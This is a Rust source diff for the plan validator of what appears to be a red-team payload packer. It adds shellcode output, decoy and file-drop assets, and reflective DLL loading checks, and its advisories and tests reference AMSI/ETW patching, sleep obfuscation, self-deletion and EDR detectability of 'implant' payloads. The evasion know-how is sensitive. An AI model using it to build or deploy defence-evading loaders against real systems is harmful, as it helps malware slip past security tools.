@@ -53,9 +53,19 @@ pub fn validate(plan: &Plan) -> Result<()> {
                     payload.name
                 )));
             }
-            validate_payload_format(step, payload)?;
+            // A `bouncer` decoy or a `drop` file is an inert asset, not a payload
+            // to run, so it is validated as data (`format: plain`) instead of
+            // against the technique's accepted execution formats.
+            if is_embedded_asset(step) {
+                validate_asset_payload(step, payload)?;
+            } else {
+                validate_payload_format(step, payload)?;
+            }
             validate_payload_sha256(payload)?;
         }
+        validate_bouncer(step)?;
+        validate_drop(step)?;
+        validate_reflective_payload(step)?;
         validate_capabilities(plan, step)?;
         validate_sleep_obfuscation(step)?;
         validate_injection_target(plan, step)?;
@@ -63,6 +73,105 @@ pub fn validate(plan: &Plan) -> Result<()> {
 
     validate_api_resolution(plan, &steps)?;
 
+    Ok(())
+}
+
+/// Whether the step carries an embedded asset (a `bouncer` decoy or a `drop`
+/// file): a Preparation step whose payload is data to write, not an Execution
+/// payload to run.
+fn is_embedded_asset(step: &ResolvedStep) -> bool {
+    matches!(
+        &step.technique,
+        TechniqueKind::Bouncer { params } if params.is_decoy()
+    ) || matches!(&step.technique, TechniqueKind::Drop { .. })
+}
+
+/// An embedded asset is inert data and must be `format: plain`.
+///
+/// No Execution technique accepts `plain` (its `formats` list is empty), so this
+/// is also what stops a plan from accidentally running the asset bytes.
+fn validate_asset_payload(step: &ResolvedStep, payload: &ResolvedPayload) -> Result<()> {
+    if payload.plan.format != PayloadFormat::Plain {
+        return Err(PackerError::Validation(format!(
+            "step {} ('{}') asset payload '{}' is 'format: {}': a '{}' asset must be \
+             'format: plain' (inert bytes the stub writes back out)",
+            step.index,
+            step.label,
+            payload.name,
+            payload.plan.format.label(),
+            step.technique.name()
+        )));
+    }
+    if payload.plan.export.is_some() {
+        return Err(PackerError::Validation(format!(
+            "asset payload '{}' declares 'export', which only applies to 'format: dll'",
+            payload.name
+        )));
+    }
+    Ok(())
+}
+
+/// Checks a `bouncer` decoy configuration that `serde` cannot express.
+///
+/// The presence of `decoy.payload` (and its existence in `build.payloads`) is
+/// already enforced by `steps::resolve`; this covers the destination path.
+fn validate_bouncer(step: &ResolvedStep) -> Result<()> {
+    let TechniqueKind::Bouncer { params } = &step.technique else {
+        return Ok(());
+    };
+    if !params.is_decoy() {
+        return Ok(());
+    }
+    if let Some(decoy) = &params.decoy {
+        if decoy.path.trim().is_empty() {
+            return Err(PackerError::Validation(format!(
+                "step {} ('{}'): `params.decoy.path` must not be empty",
+                step.index, step.label
+            )));
+        }
+    }
+    Ok(())
+}
+
+/// Checks a `drop` step's destination. `params.payload` is enforced by
+/// `steps::resolve`; this covers the path.
+fn validate_drop(step: &ResolvedStep) -> Result<()> {
+    let TechniqueKind::Drop { params } = &step.technique else {
+        return Ok(());
+    };
+    if params.path.trim().is_empty() {
+        return Err(PackerError::Validation(format!(
+            "step {} ('{}'): `params.path` must not be empty",
+            step.index, step.label
+        )));
+    }
+    Ok(())
+}
+
+/// Checks a `reflective_loading` step's payload against what the technique
+/// actually does with it.
+///
+/// `reflective_loading` maps an executable payload and calls its entry point; a
+/// DLL's `DllMain` only initializes the library (a Picaro-packed inner DLL's
+/// `DllMain` does nothing beyond `DisableThreadLibraryCalls`), so a `format: dll`
+/// payload with no `export` maps the image and silently never starts the chain.
+/// That is always a mistake: require the export the DLL exposes.
+fn validate_reflective_payload(step: &ResolvedStep) -> Result<()> {
+    if !matches!(&step.technique, TechniqueKind::ReflectiveLoading { .. }) {
+        return Ok(());
+    }
+    let Some(payload) = &step.payload else {
+        return Ok(());
+    };
+    if payload.plan.format == PayloadFormat::Dll && payload.plan.export.is_none() {
+        return Err(PackerError::Validation(format!(
+            "step {} ('{}') is 'reflective_loading' with a 'format: dll' payload ('{}') but the \
+             payload sets no 'export': a mapped DLL's `DllMain` only initializes the library, so \
+             the chain would never run — set 'build.payloads.{}.export' to the function the DLL \
+             exposes, use an executable payload, or switch the payload to 'format: shellcode'",
+            step.index, step.label, payload.name, payload.name
+        )));
+    }
     Ok(())
 }
 
@@ -290,13 +399,91 @@ fn validate_output(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
         return Ok(());
     }
 
-    if output.subsystem == Subsystem::Windows {
-        return Err(PackerError::Validation(
-            "build.output.subsystem is 'windows' but build.output.kind is 'dll': a DLL has no \
-             subsystem — the host process owns its own (and UAC/DPI awareness is per process)"
-                .to_string(),
-        ));
+    // A DLL and shellcode share the "runs inside a host" shape: the same
+    // techniques that resolve or rewrite the *host's* image are wrong in both.
+    validate_dll_like(plan, steps)?;
+
+    match output.kind {
+        OutputKind::Dll => validate_dll(plan)?,
+        OutputKind::Shellcode => validate_shellcode(plan)?,
+        _ => unreachable!("exe and psmodule returned before the host-shape checks"),
     }
+
+    Ok(())
+}
+
+/// Constraints shared by `kind: dll` and `kind: shellcode`.
+///
+/// Both run the chain inside another process — a host that loaded the DLL with
+/// the image loader, or one that ran the reflective shellcode — so every
+/// technique that resolves or rewrites the running image hits the *host*, not
+/// the artifact.
+fn validate_dll_like(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
+    let output = &plan.build.output;
+
+    if output.subsystem == Subsystem::Windows {
+        return Err(PackerError::Validation(format!(
+            "build.output.subsystem is 'windows' but build.output.kind is '{}': a DLL has no \
+             subsystem — the host process owns its own (and UAC/DPI awareness is per process)",
+            output.kind.label()
+        )));
+    }
+
+    if plan.build.stub.path.is_some() {
+        return Err(PackerError::Validation(format!(
+            "build.stub.path is set but build.output.kind is '{}': the custom-stub contract is a \
+             `fn main()`, which a DLL does not have. Use the builtin stub (a `$ENTRY_BLOCK$` \
+             contract is a documented extension, not implemented yet)",
+            output.kind.label()
+        )));
+    }
+
+    if let DllEntry::Export(name) = &output.entry {
+        validate_export_name(name)?;
+    }
+
+    for step in steps {
+        if matches!(&step.technique, TechniqueKind::SelfDeletion { .. }) {
+            return Err(PackerError::Validation(format!(
+                "step {} ('{}') is 'self_deletion' and build.output.kind is '{}': the technique \
+                 resolves the *running image* (`GetModuleFileNameW(NULL)`), which in a DLL or \
+                 shellcode build is the host — it would rename or delete the interpreter. A \
+                 reflectively-mapped DLL cannot be deleted while it is loaded anyway",
+                step.index,
+                step.label,
+                output.kind.label()
+            )));
+        }
+        if matches!(&step.technique, TechniqueKind::SleepObfuscation { .. }) {
+            return Err(PackerError::Validation(format!(
+                "step {} ('{}') is 'sleep_obfuscation' and build.output.kind is '{}': the technique \
+                 encrypts the *running image* (`GetModuleHandleA(NULL)` + `SizeOfImage`), which in \
+                 a DLL or shellcode build is the host's image — the host's other threads keep \
+                 running that code. It would also miss the payload, which lives in its own \
+                 allocation outside the host image",
+                step.index, step.label, output.kind.label()
+            )));
+        }
+        if let TechniqueKind::Bouncer { params } = &step.technique {
+            if params.on_fail == crate::techniques::bouncer::OnFail::Exit {
+                return Err(PackerError::Validation(format!(
+                    "step {} ('{}') is 'bouncer' with `on_fail: exit` and build.output.kind is \
+                     '{}': `std::process::exit` would kill the host process. Use `on_fail: \
+                     silent`",
+                    step.index,
+                    step.label,
+                    output.kind.label()
+                )));
+            }
+        }
+    }
+
+    Ok(())
+}
+
+/// Constraints specific to a host-loaded DLL that shellcode does not share.
+fn validate_dll(plan: &Plan) -> Result<()> {
+    let output = &plan.build.output;
 
     if output
         .resources
@@ -311,49 +498,47 @@ fn validate_output(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
         ));
     }
 
-    if plan.build.stub.path.is_some() {
+    Ok(())
+}
+
+/// Constraints specific to `kind: shellcode`.
+fn validate_shellcode(plan: &Plan) -> Result<()> {
+    let output = &plan.build.output;
+
+    if output.sign.is_some() {
         return Err(PackerError::Validation(
-            "build.stub.path is set but build.output.kind is 'dll': the custom-stub contract is a \
-             `fn main()`, which a DLL does not have. Use the builtin stub (a `$ENTRY_BLOCK$` \
-             contract is a documented extension, not implemented yet)"
+            "build.output.sign is set but build.output.kind is 'shellcode': shellcode is not a PE, \
+             so Authenticode signing does not apply — remove `sign`"
                 .to_string(),
         ));
     }
 
-    if let DllEntry::Export(name) = &output.entry {
-        validate_export_name(name)?;
+    if output.resources.is_some() {
+        return Err(PackerError::Validation(
+            "build.output.resources is set but build.output.kind is 'shellcode': the DLL is mapped \
+             reflectively and is absent from the loader's module list, so its resources cannot be \
+             queried — remove `resources`"
+                .to_string(),
+        ));
     }
 
-    for step in steps {
-        if matches!(&step.technique, TechniqueKind::SelfDeletion { .. }) {
-            return Err(PackerError::Validation(format!(
-                "step {} ('{}') is 'self_deletion' and build.output.kind is 'dll': the technique \
-                 resolves the *running image* (`GetModuleFileNameW(NULL)`), which in a DLL build is \
-                 the host (`java.exe`, `python.exe`, ...) — it would rename or delete the \
-                 interpreter. A mapped DLL cannot be deleted while it is loaded anyway",
-                step.index, step.label
-            )));
-        }
-        if matches!(&step.technique, TechniqueKind::SleepObfuscation { .. }) {
-            return Err(PackerError::Validation(format!(
-                "step {} ('{}') is 'sleep_obfuscation' and build.output.kind is 'dll': the technique \
-                 encrypts the *running image* (`GetModuleHandleA(NULL)` + `SizeOfImage`), which in a \
-                 DLL build is the host's image (`java.exe`, `python.exe`) — the host's other threads \
-                 keep running that code. It would also miss the payload, which lives in its own \
-                 allocation outside the host image",
-                step.index, step.label
-            )));
-        }
-        if let TechniqueKind::Bouncer { params } = &step.technique {
-            if params.on_fail == crate::techniques::bouncer::OnFail::Exit {
-                return Err(PackerError::Validation(format!(
-                    "step {} ('{}') is 'bouncer' with `on_fail: exit` and build.output.kind is \
-                     'dll': `std::process::exit` would kill the host process. Use `on_fail: \
-                     silent`",
-                    step.index, step.label
-                )));
-            }
-        }
+    if output.entry == DllEntry::JniOnLoad {
+        return Err(PackerError::Validation(
+            "build.output.entry is 'jni_on_load' but build.output.kind is 'shellcode': the \
+             reflective loader calls the plain export after `DllMain`, and `jni_on_load` exports \
+             only `JNI_OnLoad` — use `auto` or `export:<name>`"
+                .to_string(),
+        ));
+    }
+
+    if output.arch == Arch::X86 {
+        return Err(PackerError::Validation(
+            "build.output.kind is 'shellcode' with arch 'x86': the reflective loader calls the \
+             export with the sRDI shape (two arguments, cdecl), but the entry's `extern \"system\"` \
+             export is stdcall with four arguments on x86, so the stack unbalances. x86 shellcode \
+             is parked until the entry has an sRDI-shaped export"
+                .to_string(),
+        ));
     }
 
     Ok(())
@@ -505,6 +690,13 @@ pub fn advisories(plan: &Plan) -> Vec<String> {
                         .to_string(),
                 );
             }
+            TechniqueKind::Bouncer { params } if params.decoy.is_some() && !params.is_decoy() => {
+                warnings.push(format!(
+                    "step {}: 'bouncer' declares a `params.decoy` but `on_fail` is not 'decoy', so \
+                     the decoy is never written",
+                    step.index
+                ));
+            }
             TechniqueKind::PatchEtw { .. } => patched_ntdll_text = true,
             TechniqueKind::PatchAmsi { .. } => patched_amsi = true,
             // A `hardware_breakpoints` step that watches the AMSI scan exports
@@ -631,6 +823,9 @@ pub fn advisories(plan: &Plan) -> Vec<String> {
     if plan.build.output.kind == OutputKind::Dll {
         warnings.extend(dll_advisories(plan, &steps));
     }
+    if plan.build.output.kind == OutputKind::Shellcode {
+        warnings.extend(shellcode_advisories(plan, &steps));
+    }
     warnings
 }
 
@@ -724,8 +919,52 @@ fn dll_advisories(plan: &Plan, steps: &[ResolvedStep]) -> Vec<String> {
     warnings
 }
 
-/// Validates the stub's syscall layer and string obfuscation.
+/// The advisories specific to a `kind: shellcode` build.
 ///
+/// None are errors: the artifact works, but each one names a way it is louder
+/// than it has to be, or a choice the operator should make deliberately.
+fn shellcode_advisories(plan: &Plan, steps: &[ResolvedStep]) -> Vec<String> {
+    let mut warnings = Vec::new();
+    let output = &plan.build.output;
+
+    let extension = output.path.extension().and_then(|ext| ext.to_str());
+    if !extension.is_some_and(|ext| ext.eq_ignore_ascii_case("bin")) {
+        warnings.push(
+            "build.output.kind is 'shellcode' but the output path does not end in `.bin`: the \
+             artifact is raw shellcode, not a PE (a different extension is a deliberate choice)"
+                .to_string(),
+        );
+    }
+
+    warnings.push(
+        "build.output.kind is 'shellcode': the artifact is raw bytes — a host must map and run \
+         them (`msbuild` inline task, a JVM through the FFM API, …), and the reflective loader \
+         plus executable memory are well-known EDR signatures"
+            .to_string(),
+    );
+
+    if output.entry == DllEntry::Auto {
+        warnings.push(
+            "build.output.entry is 'auto': the wrapped DLL advertises `JNI_OnLoad` next to the \
+             plain export the loader actually calls; `export:<name>` is smaller and less \
+             conspicuous"
+                .to_string(),
+        );
+    }
+
+    for step in steps {
+        if matches!(&step.technique, TechniqueKind::PatchAmsi { .. }) {
+            warnings.push(format!(
+                "step {}: 'patch_amsi' loads `amsi.dll` when it is not already loaded, and the \
+                 host that runs the shellcode (`msbuild.exe`, `java.exe`) usually has none — the \
+                 step would bring the scanner into the process",
+                step.index
+            ));
+        }
+    }
+
+    warnings
+}
 /// `build.stub` itself may be empty (builtin stub, default syscall mode,
 /// default obfuscation); an unknown `syscalls.mode`/`syscalls.resolver` or
 /// `strings.strategy` is a clear error.
@@ -1548,7 +1787,7 @@ mod tests {
     #[test]
     fn proxy_rejects_a_second_payload_load() {
         let plan = parse(
-            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll }\n    b: { source: ./b.dll, format: dll }\n  stub:\n    syscalls: { mode: indirect }\n    api_resolution: { mode: proxy, apis: [\"ntdll!NtReadVirtualMemory\"] }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n  - technique: reflective_loading\n    params: { payload: b }\n",
+            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll, export: Run }\n    b: { source: ./b.dll, format: dll, export: Run }\n  stub:\n    syscalls: { mode: indirect }\n    api_resolution: { mode: proxy, apis: [\"ntdll!NtReadVirtualMemory\"] }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n  - technique: reflective_loading\n    params: { payload: b }\n",
         );
         let err = validate(&plan).expect_err("proxy with two loads");
         assert!(err.to_string().contains("proxy"), "unclear: {err}");
@@ -1743,6 +1982,53 @@ mod tests {
         "  - technique: reflective_loading\n"
     }
 
+    /// A `kind: shellcode` plan; `output_extra` is inserted after `path`/`kind`.
+    fn with_shellcode(output_extra: &str, runtime: &str) -> String {
+        format!(
+            "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    p: {{ source: ./p.exe, format: pe }}\n  output:\n    path: ./dist/o.bin\n    kind: shellcode\n{output_extra}runtime:\n{runtime}"
+        )
+    }
+
+    #[test]
+    fn accepts_a_shellcode_with_a_plain_export() {
+        let plan = parse(&with_shellcode("    entry: export:Run\n", dll_runtime()));
+        validate(&plan).expect("valid");
+    }
+
+    #[test]
+    fn rejects_signing_for_shellcode() {
+        let plan = parse(&with_shellcode("    sign: { mode: lab }\n", dll_runtime()));
+        let err = validate(&plan).expect_err("shellcode is not a PE");
+        assert!(err.to_string().contains("sign"), "unclear: {err}");
+    }
+
+    #[test]
+    fn rejects_the_jni_entry_for_shellcode() {
+        let plan = parse(&with_shellcode("    entry: jni_on_load\n", dll_runtime()));
+        let err = validate(&plan).expect_err("no plain export to call");
+        assert!(err.to_string().contains("jni_on_load"), "unclear: {err}");
+    }
+
+    #[test]
+    fn rejects_resources_for_shellcode() {
+        let plan = parse(&with_shellcode(
+            "    resources: { icon: random }\n",
+            dll_runtime(),
+        ));
+        let err = validate(&plan).expect_err("resources are PE-only");
+        assert!(err.to_string().contains("resources"), "unclear: {err}");
+    }
+
+    #[test]
+    fn rejects_x86_shellcode() {
+        let plan = parse(&with_shellcode(
+            "    entry: export:Run\n    arch: x86\n",
+            dll_runtime(),
+        ));
+        let err = validate(&plan).expect_err("the export shape unbalances on x86");
+        assert!(err.to_string().contains("x86"), "unclear: {err}");
+    }
+
     #[test]
     fn accepts_a_dll_with_a_plain_export() {
         let plan = parse(&with_dll("    entry: export:Run\n", dll_runtime()));
@@ -1855,6 +2141,84 @@ mod tests {
             err.to_string().contains("kill the host"),
             "unclear error: {err}"
         );
+    }
+
+    // --- bouncer decoy ---
+
+    const DECOY_PLAN: &str = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    implant: { source: ./p.exe, format: pe }\n    doc: { source: ./d.bin, format: FORMAT }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: bouncer\n    params: { on_fail: decoy, hostname: h, decoy: { path: x, payload: doc } }\n  - technique: reflective_loading\n    params: { payload: implant }\n";
+
+    #[test]
+    fn accepts_a_plain_bouncer_decoy() {
+        let plan = parse(&DECOY_PLAN.replace("FORMAT", "plain"));
+        validate(&plan).expect("a format: plain decoy is valid");
+    }
+
+    #[test]
+    fn rejects_a_bouncer_decoy_that_is_not_plain() {
+        let plan = parse(&DECOY_PLAN.replace("FORMAT", "pe"));
+        let err = validate(&plan).expect_err("a non-plain decoy");
+        assert!(err.to_string().contains("format: plain"), "unclear: {err}");
+    }
+
+    #[test]
+    fn a_bouncer_decoy_without_a_payload_is_rejected() {
+        let plan = parse(&with_runtime(
+            "  - technique: bouncer\n    params: { on_fail: decoy, hostname: h }\n  - technique: reflective_loading\n",
+        ));
+        let err = validate(&plan).expect_err("decoy without a payload");
+        assert!(err.to_string().contains("decoy"), "unclear: {err}");
+    }
+
+    // --- drop ---
+
+    const DROP_PLAN: &str = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    implant: { source: ./p.exe, format: pe }\n    doc: { source: ./d.bin, format: FORMAT }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: drop\n    params: { path: \"TEST.docx\", payload: doc }\n  - technique: reflective_loading\n    params: { payload: implant }\n";
+
+    #[test]
+    fn accepts_a_plain_drop_asset() {
+        validate(&parse(&DROP_PLAN.replace("FORMAT", "plain"))).expect("valid");
+    }
+
+    #[test]
+    fn rejects_a_drop_asset_that_is_not_plain() {
+        let err = validate(&parse(&DROP_PLAN.replace("FORMAT", "pe"))).expect_err("non-plain");
+        assert!(err.to_string().contains("format: plain"), "unclear: {err}");
+    }
+
+    #[test]
+    fn rejects_a_drop_without_a_payload() {
+        let plan = parse(&with_runtime(
+            "  - technique: drop\n    params: { path: TEST.docx }\n  - technique: reflective_loading\n",
+        ));
+        let err = validate(&plan).expect_err("drop without a payload");
+        assert!(err.to_string().contains("payload"), "unclear: {err}");
+    }
+
+    #[test]
+    fn rejects_a_drop_with_an_empty_path() {
+        let plan = parse(
+            &DROP_PLAN
+                .replace("FORMAT", "plain")
+                .replace("\"TEST.docx\"", "\"\""),
+        );
+        let err = validate(&plan).expect_err("empty drop path");
+        assert!(err.to_string().contains("params.path"), "unclear: {err}");
+    }
+
+    /// The shape of `full-evasion.yaml`: drop a plain asset, gate on a process,
+    /// then run the payload — a `kind: dll` build with `reflective_loading`.
+    #[test]
+    fn a_drop_bouncer_reflective_pipeline_is_valid() {
+        let yaml = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    implant: { source: ./p.dll, format: dll, export: Run }\n    doc: { source: ./d.bin, format: plain }\n  output: { path: ./dist/o.dll, kind: dll }\nruntime:\n  - technique: drop\n    params: { path: \"TEST.docx\", payload: doc }\n  - technique: bouncer\n    params: { on_fail: silent, processes: [{ name: calc.exe, state: present }] }\n  - technique: reflective_loading\n    params: { payload: implant }\n";
+        validate(&parse(yaml)).expect("the drop + bouncer + reflective pipeline is valid");
+    }
+
+    #[test]
+    fn rejects_reflective_loading_of_a_dll_without_an_export() {
+        let plan = parse(
+            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
+        );
+        let err = validate(&plan).expect_err("a mapped DLL without an export is a no-op");
+        assert!(err.to_string().contains("export"), "unclear: {err}");
     }
 
     #[test]
